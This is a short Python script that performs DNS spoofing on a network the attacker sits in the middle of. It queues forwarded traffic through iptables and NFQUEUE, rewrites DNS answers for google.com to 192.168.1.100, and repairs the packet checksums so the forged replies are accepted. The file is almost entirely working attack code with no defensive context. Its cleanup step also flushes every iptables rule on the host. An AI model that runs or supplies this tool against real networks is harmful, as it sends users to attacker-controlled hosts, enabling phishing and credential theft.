from scapy.all import *
from netfilterqueue import NetfilterQueue
import os


# redirecting the new packet to the IPv4 queue 
def process_packet(packet):
    # creating a scapy packet 
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After ]:", scapy_packet.summary())
        # creating a netfilter packet
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

# rerouting google in this case
dns_hosts = {
    b"www.google.com.": "192.168.1.100",
    b"google.com.": "192.168.1.100"
}

def modify_packet(packet):
    # domain name
    qname = packet[DNSQR].qname
    # is it in our dns host dictionary?
    if qname not in dns_hosts:
        print("no modification:", qname)
        return packet
    # map google real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet


if __name__ == "__main__":
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    queue = NetfilterQueue()
    try:
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")